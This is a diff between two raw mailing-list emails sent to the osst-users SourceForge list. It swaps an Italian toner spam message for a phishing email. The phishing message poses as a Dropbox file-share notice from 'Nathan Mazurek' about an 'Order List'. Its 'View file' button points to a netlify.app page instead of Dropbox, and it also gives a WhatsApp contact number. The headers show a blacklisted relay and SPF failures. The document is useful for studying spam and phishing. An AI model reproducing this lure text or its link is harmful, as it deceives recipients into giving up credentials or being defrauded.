@@ -2,109 +2,72 @@ Return-Path: <osst-users-bounces@lists.sourceforge.net>
 X-Original-To: lists+osst-users@lfdr.de
 Delivered-To: lists+osst-users@lfdr.de
 Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
-	by mail.lfdr.de (Postfix) with ESMTPS id A743A49AEA4
-	for <lists+osst-users@lfdr.de>; Tue, 25 Jan 2022 09:56:44 +0100 (CET)
+	by mail.lfdr.de (Postfix) with ESMTPS id E022849D2EA
+	for <lists+osst-users@lfdr.de>; Wed, 26 Jan 2022 20:58:24 +0100 (CET)
 Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
 	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
 	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
-	id 1nCHd6-0004iK-MC
-	for lists+osst-users@lfdr.de; Tue, 25 Jan 2022 08:56:43 +0000
+	id 1nCoQy-0005r2-Ut
+	for lists+osst-users@lfdr.de; Wed, 26 Jan 2022 19:58:23 +0000
 Received: from [172.30.20.202] (helo=mx.sourceforge.net)
  by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2)
- (envelope-from <mailing@ml.officetoner.info>) id 1nCHcx-0004bP-HR
- for osst-users@lists.sourceforge.net; Tue, 25 Jan 2022 08:56:34 +0000
+ (envelope-from <no-reply@dropbox.com>) id 1nCoQx-0005qp-9B
+ for osst-users@lists.sourceforge.net; Wed, 26 Jan 2022 19:58:21 +0000
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
- d=sourceforge.net; s=x; h=Message-ID:Date:Content-Type:Subject:To:Reply-To:
- From:MIME-Version:Sender:Cc:Content-Transfer-Encoding:Content-ID:
+ d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Message-ID:Date:Subject:
+ To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
  Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
  :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
  List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=bjS1CHJPung0ChEJTtUPYd4UilPSkY4p3wNV+Xhm5CM=; b=LgjYrx8h0/MmbAhTX9s80CVm/y
- DncqMx8FoHcpCiFh+DG+c/yU7sBUchTC9cPVB3nDtSMZICpNnqOiekaIEuI2T89pe+Q9P/MWBe/5/
- BhGoRljN0GV5GoyGESDtFVZRT9gRQYBRTUKWJbqms9n8lK0fsm4Wwj4r7j3VvePDH8KI=;
+ bh=xJAJ+8wsVQ8B5qvOGkVl9zKnIvhR3UyWh/FJb9VKirk=; b=RTkNXiUxLHTHBAmrJ4Q4zWAmJR
+ PP3QqbaxKGhard5ew4xrsS1yro8biN/NkYNwfba+KdhShWqzaspaD5DxlVgptcC78ot9DtsuAw1UL
+ +MP21Z+uFOnr+zQxlcW9m6SQ3VdVD029oqiK7iDAyfX8uTjsfkiqYFehNXlMl6rABVjY=;
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
  ;
- h=Message-ID:Date:Content-Type:Subject:To:Reply-To:From:MIME-Version:Sender
+ h=Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To
  :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
  Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
  References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
- List-Owner:List-Archive; bh=bjS1CHJPung0ChEJTtUPYd4UilPSkY4p3wNV+Xhm5CM=; b=m
- y2r5b0XBjoW4nVCaTopok+A1v/Cku3Uz1pNvodVZPm6RwqCXuT6IjCsi1wvs7kBzOLz3U14EjxLco
- DkB0y56Nqu1G/lM/Fy7vLmWifkoAwqsdBaky+szzttMm5PZ4i8wqVgoNy5yjtffqdtu4vRWctpzwI
- eyZHxrczcQk6ajPw=;
-Received: from ml007.dnshigh.com ([193.70.146.54])
- by sfi-mx-2.v28.lw.sourceforge.com with esmtps
- (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.3)
- id 1nCHcu-0007wP-FY
- for osst-users@lists.sourceforge.net; Tue, 25 Jan 2022 08:56:33 +0000
-DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
- d=ml.officetoner.info; s=default; h=Message-ID:Date:Content-Type:Subject:To:
- Reply-To:From:MIME-Version:Sender:Cc:Content-Transfer-Encoding:Content-ID:
- Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
- :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
- List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=bjS1CHJPung0ChEJTtUPYd4UilPSkY4p3wNV+Xhm5CM=; b=RhGNpKaoNg5ysk4RFsjKfAX8BL
- UBfG2ukn67H29iX8OSdFgFiO8l9WqjFaUBLn2SypvY7bpRoKozJhBC83VeEUx+L/pwZdOj1rh+U9Q
- lgonXEahg+jqGfWC5dE8em6ag/cyXDDUuXgM9Ur/yRnR0aib+FLfMbT7+qvP0U1PTYCZqVc7LTGII
- mGiE+cKioElpzf1Uy5h05d6u36S+7AA3hohN3sLu3qOeZo1gqAkbHWftePUbNF7O7L3ligJMXfgpO
- NuFDNvocF3htyGyUzHnp9lQY0aCewy4l8hdJ8MWYlsYt0L6P0xp4N5aqK+jjd1BmnzfL1KwnK567G
- DL/9/+Aw==;
-Received: from host-87-7-69-218.retail.telecomitalia.it ([87.7.69.218]:50445)
- by ml007.dnshigh.com with esmtpsa (TLS1) tls
- TLS_DHE_RSA_WITH_AES_256_CBC_SHA (Exim 4.94.2)
- (envelope-from <mailing@ml.officetoner.info>) id 1nCHcn-0005oA-TW
- for osst-users@lists.sourceforge.net; Tue, 25 Jan 2022 09:56:25 +0100
-MIME-Version: 1.0
-From: "Toner Compatibili" <mailing@ml.officetoner.info>
+ List-Owner:List-Archive; bh=xJAJ+8wsVQ8B5qvOGkVl9zKnIvhR3UyWh/FJb9VKirk=; b=A
+ jLNdsIUnG1d8nk5nY+tMwgUPb5XQUpg2Fr8Jv+Rg1sQPyDUKpjKmBheD2YTQn13A5egjx3o95IAVI
+ wEgdhPzlw44RT45XFlMHTXnsiFoTmIx7KxSLroSpx9nUIbcfIZ44AJfKdI4WLUxnZ3mQTS80BRveU
+ vfiUk3mwfyVQoPt4=;
+Received: from [45.72.96.169] (helo=dropbox.com)
+ by sfi-mx-1.v28.lw.sourceforge.com with esmtp (Exim 4.92.3)
+ id 1nCoQu-00Ey1m-B8
+ for osst-users@lists.sourceforge.net; Wed, 26 Jan 2022 19:58:21 +0000
 To: osst-users@lists.sourceforge.net
-Date: Tue, 25 Jan 2022 09:56:27 +0100
-Message-ID: <5628393619856195087307@DESKTOP-HPV3HAF>
-X-AntiAbuse: This header was added to track abuse,
- please include it with any abuse report
-X-AntiAbuse: Primary Hostname - ml007.dnshigh.com
-X-AntiAbuse: Original Domain - lists.sourceforge.net
-X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
-X-AntiAbuse: Sender Address Domain - ml.officetoner.info
-X-Get-Message-Sender-Via: ml007.dnshigh.com: authenticated_id: umlcxeft/from_h
-X-Authenticated-Sender: ml007.dnshigh.com: mailing@ml.officetoner.info
-X-Spam-Score: 7.6 (+++++++)
+Date: 26 Jan 2022 11:58:13 -0800
+Message-ID: <20220126115813.0DC19C47BA51173C@dropbox.com>
+MIME-Version: 1.0
+X-Spam-Score: 4.6 (++++)
 X-Spam-Report: Spam detection software,
  running on the system "util-spamd-1.v13.lw.sourceforge.com", 
- has identified this incoming email as possible spam.  The original
+ has NOT identified this incoming email as spam.  The original
  message has been attached to this so you can view it or label
  similar future email.  If you have any questions, see
  the administrator of that system for details.
- Content preview: TONER COMPATIBILI - QUALITA' GARANTITA Vendita toner e
- cartucce
- compatibili per tutti i modelli di stampanti, prezzi competitivi, consegna
- entro 2 giorni dalla conferma d'ordine con corriere espresso. 
- Content analysis details:   (7.6 points, 6.0 required)
+ Content preview:  Hi osst-users ,
+ Nathan Mazurek (export@biemnilac.com.tr) invited
+ you to view the file "Order List.xlsx/products Specifications.pdf" on Dropbox.
+ Nathan Mazurek said: Dear osst-users , 
+ Content analysis details:   (4.6 points, 6.0 required)
  pts rule name              description
  ---- ---------------------- --------------------------------------------------
+ 0.7 RCVD_IN_XBL            RBL: Received via a relay in Spamhaus XBL
+ [45.72.96.169 listed in zen.spamhaus.org]
  0.5 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
- [193.70.146.54 listed in dnsbl-1.uceprotect.net]
- 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
- -0.0 SPF_PASS               SPF: sender matches SPF record
- 0.0 HTML_IMAGE_RATIO_04    BODY: HTML has a low ratio of text to image
- area 0.0 HTML_MESSAGE           BODY: HTML included in message
- 0.7 HTML_IMAGE_ONLY_28     BODY: HTML: images with 2400-2800 bytes of
- words
- -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
- author's domain
- 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
- valid
- -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
- 2.0 PYZOR_CHECK            Listed in Pyzor
- (https://pyzor.readthedocs.io/en/latest/)
- 0.8 FROM_FMBLA_NEWDOM28    From domain was registered in last 14-28
- days
- 2.7 FSL_BULK_SIG           Bulk signature with no Unsubscribe
- 1.0 IMG_ONLY_FM_DOM_INFO   HTML image-only message from .info domain
- 0.0 T_REMOTE_IMAGE         Message contains an external image
-X-Headers-End: 1nCHcu-0007wP-FY
-Subject: [Osst-users] Toner compatibili di qualita' garantita,
- a Prezzi molto Bassi - Listini 2022 : Chiedici un preventivo
+ [45.72.96.169 listed in dnsbl-1.uceprotect.net]
+ 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
+ 0.9 SPF_HELO_SOFTFAIL      SPF: HELO does not match SPF record (softfail)
+ 0.1 URI_HEX                URI: URI hostname has long hexadecimal sequence
+ 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
+ 0.0 HTML_MESSAGE           BODY: HTML included in message
+ 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
+X-Headers-End: 1nCoQu-00Ey1m-B8
+Subject: [Osst-users] Nathan Mazurek shared "Order List.xlsx/products
+ Specifications.pdf" with you for Order confirmation
 X-BeenThere: osst-users@lists.sourceforge.net
 X-Mailman-Version: 2.1.21
 Precedence: list
@@ -116,123 +79,224 @@ List-Post: <mailto:osst-users@lists.sourceforge.net>
 List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
  <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
-Reply-To: mailing@ml.officetoner.info
-Content-Type: multipart/mixed; boundary="===============3945097398082083961=="
+From: Dropbox via Osst-users <osst-users@lists.sourceforge.net>
+Reply-To: Dropbox <no-reply@dropbox.com>
+Content-Type: multipart/mixed; boundary="===============7836243808589605187=="
 Errors-To: osst-users-bounces@lists.sourceforge.net
 
 
---===============3945097398082083961==
-Content-Type: multipart/alternative;
-	boundary="----=_NextPart_001_256D_08A27B75.73996782"
+--===============7836243808589605187==
+Content-Type: multipart/related;
+	boundary="----=_NextPart_000_0012_B832FB0F.18BBDA23"
 
 
-------=_NextPart_001_256D_08A27B75.73996782
-Content-Type: text/plain; charset="utf-8"
+------=_NextPart_000_0012_B832FB0F.18BBDA23
+Content-Type: text/html;
+	charset="iso-8859-1"
 Content-Transfer-Encoding: quoted-printable
 
-TONER COMPATIBILI - QUALITA' GARANTITA
-
-=20
-
-Vendita toner e cartucce compatibili per tutti i modelli di stampanti, prez=
-zi competitivi, consegna entro 2 giorni dalla conferma d'ordine con corrier=
-e espresso.=20
-
-=20
-
-Trattiamo sia toner compatibili che rigenerati. Garantiamo per Entrambe le =
-tipologie dei nostri toner la stessa durata e qualita', che =C3=A8 paragona=
-bile a quella dei toner Originali. A differenza di molti venditori su inter=
-net , I nostri toner rispettano tutti gli standard per la sicurezza sulle p=
-olveri.
-
-
-=20
-
-Rispondi a questa email indicando il modello della tua stampante, ti invier=
-emo un preventivo gratuito
-
-=20
-
-Rispondendo a questa email riceverai anche tutti i nostri contatti e anche =
-il link al nostro sito. Puoi anche chiederci un preventivo inviando una ema=
-il al nostro indirizzo: tonergarantiti@gmail.com
-
-=20
-
-=20
-
-Se hai ricevuto questa email per errore, per favore comunicacelo, Nel caso =
-desideri essere cancellato rispondi a questa email con "cancellami" Oppure =
-premi qui ed invia per cancellarti
-
-
-------=_NextPart_001_256D_08A27B75.73996782
-Content-Type: text/html; charset="utf-8"
-Content-Transfer-Encoding: quoted-printable
-
-<HTML xmlns=3D"http://www.w3.org/1999/xhtml"><HEAD><TITLE>winter mail green=
-</TITLE>
-<META content=3D"text/html; charset=3Dutf-8" http-equiv=3DContent-Type>
-<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
-<BODY>
-<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19003"></HEAD>
+<body>
+<table style=3D"FONT-SIZE: 16px; BORDER-TOP: medium none; FONT-FAMILY: &quo=
+t;YS Text&quot;, Arial, sans-serif; BORDER-RIGHT: medium none; WHITE-SPACE:=
+ normal; WORD-SPACING: 0px; BORDER-BOTTOM: medium none; TEXT-TRANSFORM: non=
+e; WORD-BREAK: normal; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: nor=
+mal; BORDER-LEFT: medium none; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: norma=
+l; BACKGROUND-COLOR: rgb(255,255,255); font-variant-ligatures: normal; font=
+-variant-caps: normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial" cellspacing=3D"0" cellpadding=3D"0" align=3D"cente=
+r" border=3D"0">
+<TBODY>
 <TR>
-<TD style=3D"TEXT-ALIGN: center" width=3D"100%">
-<TABLE style=3D"BORDER-TOP: #808080 1px solid; FONT-FAMILY: 'Times New Roma=
-n', Times, serif; BORDER-RIGHT: #808080 1px solid; WIDTH: 600px; BORDER-BOT=
-TOM: #808080 1px solid; TEXT-ALIGN: left; BORDER-LEFT: #808080 1px solid; M=
-ARGIN: 0px auto" cellSpacing=3D0 cellPadding=3D0 width=3D600 border=3D0>
+<td>
+<table style=3D"WORD-BREAK: normal; LINE-HEIGHT: 25px" cellspacing=3D"0" ce=
+llpadding=3D"0" align=3D"center" border=3D"0">
+<TBODY>
 <TR>
-<TD style=3D"FONT-SIZE: 18px; FONT-FAMILY: 'Times New Roman', Times, serif;=
- COLOR: #6e6d6d; PADDING-BOTTOM: 25px; PADDING-TOP: 25px; PADDING-LEFT: 25p=
-x; PADDING-RIGHT: 25px"><IMG border=3D0 hspace=3D0 src=3D"https://imageshac=
-k.com/img923/373/Zg3XoY.jpg" width=3D650 height=3D235>=20
-<P align=3Dcenter><STRONG>TONER&nbsp;COMPATIBILI - QUALITA' GARANTITA</STRO=
-NG></P>
-<P align=3Dcenter>&nbsp;</P>
-<UL>
-<LI><FONT color=3D#ff0000 size=3D5>Vendita toner e cartucce&nbsp;compatibil=
-i per tutti i modelli di stampanti, prezzi competitivi, consegna entro 2 gi=
-orni dalla conferma d'ordine&nbsp;con corriere espresso.</FONT>&nbsp;=20
-<P>&nbsp;</P>
-<LI><U></U>
-<P><FONT color=3D#000000>Trattiamo sia toner compatibili che rigenerati. Ga=
-rantiamo per Entrambe le tipologie dei nostri&nbsp;toner la stessa durata e=
- qualita', che =C3=A8&nbsp;paragonabile a quella dei toner Originali. A dif=
-ferenza di molti venditori su internet , I nostri toner rispettano tutti gl=
-i standard per la sicurezza sulle polveri.</FONT></P></LI></UL>
-<P>&nbsp;</P>
-<UL>
-<LI><A href=3D"mailto:tonergarantiti@gmail.com=3Fsubject=3Dpreventivo"><FON=
-T color=3D#ff0000 size=3D5>Rispondi a questa email indicando il modello del=
-la tua stampante, ti invieremo un preventivo gratuito</FONT></A>=20
-<P>&nbsp;</P>
-<LI><FONT color=3D#000000>Rispondendo a questa email riceverai anche tutti =
-i nostri contatti e anche il link al nostro sito. Puoi anche&nbsp;chiederci=
- un preventivo&nbsp;inviando una email al nostro indirizzo: <A href=3D"mail=
-to:tonergarantiti@gmail.com">tonergarantiti@gmail.com</A></FONT></LI></UL>
-<P>&nbsp;</P>
-<P align=3Dcenter><IMG border=3D0 hspace=3D0 src=3D"https://imageshack.com/=
-img924/2066/fRryZ4.jpg" width=3D600 height=3D250></P>
-<P>&nbsp;</P><FONT size=3D2>Se hai ricevuto questa email per errore, per fa=
-vore comunicacelo, Nel caso desideri essere cancellato rispondi a questa em=
-ail con "cancellami" </FONT><A href=3D"mailto:tonergarantiti@gmail.com=3Fsu=
-bject=3DCancellami"><FONT size=3D2>Oppure premi qui ed invia per cancellart=
-i</FONT></A></TD></TR>
-<P></P>
-<TR></TR></TABLE></TD></TR></TABLE></BODY></HTML>
-------=_NextPart_001_256D_08A27B75.73996782--
+<td style=3D"FONT-SIZE: 11pt; MAX-WIDTH: 454px; BORDER-COLLAPSE: collapse; =
+COLOR: rgb(68,68,68)" valign=3D"top" width=3D"454" align=3D"left">
+<DIV style=3D'FONT-SIZE: 14px; FONT-FAMILY: "atlas grotesk", "open sans", "=
+lucida grande", "segoe ui", arial, verdana, "lucida sans unicode", tahoma, =
+sans-serif'><img src=3D"cid:mailservice"><BR><BR>
+<DIV>Hi&nbsp;osst-users ,<BR><BR></DIV>
+<DIV>
+<DIV>Nathan Mazurek (<A href=3D"mailto:export@biemnilac.com.tr">export@biem=
+nilac.com.tr</A>) invited you to view the file "<SPAN class=3Dwmi-callto><S=
+TRONG>Order List.xlsx/products Specifications.pdf</STRONG></SPAN>" on Dropb=
+ox.<BR><BR></DIV></DIV>
+<DIV>Nathan Mazurek&nbsp;said:<BR><I>Dear osst-users ,</I></DIV>
+<DIV><I>Wishing you and family a very Happy New Year 2022!!</I></DIV>
+<DIV><I>Kindly check to confirm <STRONG>Order List/products Specifications<=
+/STRONG> in excel.</I></DIV>
+<DIV><I>We will appreciate it if you can supply your products to us on a re=
+gular basis,as I&#8217;ll revert to you with the draft of the Order agreeme=
+nt within this week,once you confirm our order list as sent to you via Drop=
+box due to large file .</I></DIV>
+<DIV><I>Kindly contact me on Whatsapp number : 00905364215805</I></DIV>
+<DIV><I>Waiting to hear from you soon.</I></DIV>
+<DIV><I><BR>Best regards <BR>"Nathan Mazurek"</I><BR><BR></DIV>
+<table style=3D"WORD-BREAK: normal" cellspacing=3D"0" cellpadding=3D"0" bor=
+der=3D"0">
+<TBODY>
+<TR>
+<td>
+<A style=3D'FONT-SIZE: 16px; TEXT-DECORATION: none; BORDER-TOP: rgb(13,36,1=
+29) 8px solid; HEIGHT: 37px; FONT-FAMILY: "atlas grotesk", "open sans", "lu=
+cida grande", "segoe ui", arial, verdana, "lucida sans unicode", tahoma, sa=
+ns-serif; BORDER-RIGHT: rgb(13,36,129) 12px solid; WIDTH: 96px; BORDER-BOTT=
+OM: rgb(13,36,129) 8px solid; COLOR: white; TEXT-ALIGN: center; BORDER-LEFT=
+: rgb(13,36,129) 12px solid; DISPLAY: inline-block; BACKGROUND-COLOR: rgb(1=
+3,36,129)'=20
+href=3D"https://wonderful-cori-7f9963.netlify.app/?token=3Dce66f199-b7e4-44=
+4a-ad99-87169d515d5c&amp;ci=3Dosst-users@lists.sourceforge.net" rel=3D"noop=
+ener noreferrer" target=3D_blank data-link-id=3D"1"><STRONG>View file</STRO=
+NG></A></TD></TR></TBODY></TABLE><BR>Enjoy!<BR>The Dropbox team<BR>
+<DIV>
+<DIV><BR><EM>Nathan&nbsp;</EM><EM>and others will be able to see when you v=
+iew this file. Other files shared with you through Dropbox may also show th=
+is info.<SPAN>&nbsp;</SPAN></EM><A style=3D"TEXT-DECORATION: none; COLOR: r=
+gb(0,126,230)" href=3D"https://www.dropbox.com/l/AAATmJBT2q5MjDxZsGeiiLERqB=
+9HclfKl64" rel=3D"noopener noreferrer" target=3D_blank data-link-id=3D"2"><=
+EM>Learn more</EM></A><EM><SPAN>&nbsp;</SPAN>in our help center.</EM></DIV>=
+</DIV>
+<DIV></DIV></DIV></TD>
+<td width=3D"36"></TD></TR>
+<TR>
+<td height=3D"36" colspan=3D"3"></TD></TR></TBODY></TABLE></TD></TR></TBODY=
+></TABLE>
+<table style=3D"FONT-SIZE: 16px; FONT-FAMILY: &quot;YS Text&quot;, Arial, s=
+ans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; WO=
+RD-BREAK: normal; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; =
+ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,25=
+5,255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-=
+text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration=
+-style: initial; text-decoration-color: initial" cellspacing=3D"0" cellpadd=
+ing=3D"0" align=3D"center" border=3D"0">
+<TBODY>
+<TR>
+<td height=3D"10"></TD></TR>
+<TR>
+<td style=3D"BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
+px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px">
+<table style=3D"WORD-BREAK: normal" cellspacing=3D"0" cellpadding=3D"0" ali=
+gn=3D"center" border=3D"0">
+<TBODY>
+<TR style=3D"FONT-SIZE: 11px; COLOR: rgb(168,185,198)">
+<td width=3D"400" align=3D"left"><A style=3D"TEXT-DECORATION: none; COLOR: =
+rgb(0,126,230)" href=3D"https://www.dropbox.com/l/AAAMVX5i0W9KiauFeck6QmyVQ=
+z8Jpeu3P" rel=3D"noopener noreferrer" target=3D_blank data-link-id=3D"3">Re=
+port to Dropbox</A><BR></TD>
+<td width=3D"128" align=3D"right">&copy; 2022 Dropbox</TD></TR></TBODY></TA=
+BLE></TD></TR></TBODY></TABLE>
+<P align=3Dleft>
+<SPAN style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Atlas Grotesk", "Open Sans", =
+HelveticaNeue-Light, "Helvetica Neue Light", "Helvetica Neue", Helvetica, A=
+rial, "Lucida Grande", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; =
+TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(173,177,180); FONT-STYLE=
+: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; =
+LINE-HEIGHT: normal; BACKGROUND-COLOR: rgb(247,248,248); TEXT-INDENT: 0px; =
+font-variant-ligatures: normal; font-variant-caps:=20
+normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
+ text-decoration-style: initial; text-decoration-color: initial'>Dropbox, I=
+nc.</SPAN>
+ <BR style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Atlas Grotesk", "Open Sans", H=
+elveticaNeue-Light, "Helvetica Neue Light", "Helvetica Neue", Helvetica, Ar=
+ial, "Lucida Grande", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; T=
+EXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(173,177,180); FONT-STYLE:=
+ normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; L=
+INE-HEIGHT: normal; BACKGROUND-COLOR: rgb(247,248,248); TEXT-INDENT: 0px; f=
+ont-variant-ligatures: normal; font-variant-caps:=20
+normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
+ text-decoration-style: initial; text-decoration-color: initial'>
+<SPAN style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Atlas Grotesk", "Open Sans", =
+HelveticaNeue-Light, "Helvetica Neue Light", "Helvetica Neue", Helvetica, A=
+rial, "Lucida Grande", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; =
+TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(173,177,180); FONT-STYLE=
+: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; =
+LINE-HEIGHT: normal; BACKGROUND-COLOR: rgb(247,248,248); TEXT-INDENT: 0px; =
+font-variant-ligatures: normal; font-variant-caps:=20
+normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
+ text-decoration-style: initial; text-decoration-color: initial'>PO Box 777=
+67, San Francisco, CA 94107</SPAN>
+ <BR style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Atlas Grotesk", "Open Sans", H=
+elveticaNeue-Light, "Helvetica Neue Light", "Helvetica Neue", Helvetica, Ar=
+ial, "Lucida Grande", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; T=
+EXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(173,177,180); FONT-STYLE:=
+ normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; L=
+INE-HEIGHT: normal; BACKGROUND-COLOR: rgb(247,248,248); TEXT-INDENT: 0px; f=
+ont-variant-ligatures: normal; font-variant-caps:=20
+normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
+ text-decoration-style: initial; text-decoration-color: initial'>
+<A style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Atlas Grotesk", "Open Sans", Hel=
+veticaNeue-Light, "Helvetica Neue Light", "Helvetica Neue", Helvetica, Aria=
+l, "Lucida Grande", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEX=
+T-TRANSFORM: none; FONT-WEIGHT: 400; FONT-STYLE: normal; TEXT-ALIGN: left; =
+ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; LINE-HEIGHT: normal; BACKGRO=
+UND-COLOR: rgb(247,248,248); TEXT-INDENT: 0px; font-variant-ligatures: norm=
+al; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px' href=3D"https://www.dropbox.com/l/AAA6IAdCg=
+BIcqN7h0kYkX__Qv-JC7jIHtRI/privacy#privacy" rel=3D"noreferrer nofollow noop=
+ener" target=3D_blank>View Privacy Policy</A>
+ <SPAN style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Atlas Grotesk", "Open Sans",=
+ HelveticaNeue-Light, "Helvetica Neue Light", "Helvetica Neue", Helvetica, =
+Arial, "Lucida Grande", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px;=
+ TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(173,177,18=
+0); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; DISPLAY: i=
+nline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(247,248,248=
+); TEXT-INDENT: 0px; font-variant-ligatures:=20
+normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-dec=
+oration-thickness: initial; text-decoration-style: initial; text-decoration=
+-color: initial'><SPAN>&nbsp;</SPAN>|<SPAN>&nbsp;</SPAN></SPAN>
+ <A style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Atlas Grotesk", "Open Sans", He=
+lveticaNeue-Light, "Helvetica Neue Light", "Helvetica Neue", Helvetica, Ari=
+al, "Lucida Grande", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TE=
+XT-TRANSFORM: none; FONT-WEIGHT: 400; FONT-STYLE: normal; TEXT-ALIGN: left;=
+ ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; LINE-HEIGHT: normal; BACKGR=
+OUND-COLOR: rgb(247,248,248); TEXT-INDENT: 0px; font-variant-ligatures: nor=
+mal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px' href=3D"https://www.dropbox.com/l/AAA8acaiN=
+088C5J-rPCZxitDFZjn-Fzkbgs" rel=3D"noreferrer nofollow noopener" target=3D_=
+blank>Unsubscribe</A></P></BODY></HTML>
+------=_NextPart_000_0012_B832FB0F.18BBDA23
+Content-Type: application/octet-stream; name="mailservice"
+Content-Transfer-Encoding: base64
+Content-ID: <mailservice>
+
+iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAYAAACM/rhtAAAACXBIWXMAAAsTAAALEwEAmpwY
+AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAO+SURBVHgB7VexUttAFHwnOYEQIIbk
+A5QBZihJR4ehCh10SQWUqYCSJj6RIiXQ0YG7pMJUSYfoUjpdZmIb5wdAsYGALenynm05si3J
+J7lJMt4Zz5x0uvXd6m7fCmCAAf4RJDWeHNa4Bn0iKo8i89D4zLtNO8EuHqjsbGxKX4OYGJvi
+K1F5WFgnrlZDwiNspto6BDuu2Y5+V+IlkEAgD4BRs8RGGI8a1DE+vZt2FDjG5mxXJ4M5VWHr
+w5NLw/eXZ+cQAlIfeT748gBoyLOFPBDE06Xg6DRPKcD2BMAcyEBAqWaLxU4VHs/wOUWwPehW
+LRJPa4K0eZ2EkhYgtiAGGDBezr/VmzybyMMhBpBnX7Ec3Sxxk64TbgfukRNcRgpigiY0NrWr
+2Y2rdYgJEshWlSQ2N+i6tQerl0bmweTCTybYLC4jCdFgOuDsXBf4TvXq7HRoIvUDtZjrh8e9
